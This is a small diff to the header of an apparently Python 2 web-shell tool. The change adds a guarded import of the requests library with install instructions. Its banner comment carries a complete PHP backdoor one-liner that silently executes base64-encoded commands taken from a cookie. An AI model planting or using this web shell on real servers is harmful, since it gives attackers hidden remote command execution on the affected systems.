@@ -6,12 +6,18 @@
 #
 # 
 ###############################################
+#                                             #
 import os                                     #
 import sys                                    #
 import urllib                                 #
 import optparse                               #
-import requests                               #
+try:                                          # 
+    import requests                           #
+except:                                       ################################
+    print "\t\nPlease install requests library, you can do it executing: \n" #
+    print "\t\npip install requests"          ################################
 from sys import argv                          #
+#                                             #
 ############################################################################
 #                                                                          #
 # Code: <?php error_reporting(0); system(base64_decode($_COOKIE["1"])); ?> ###
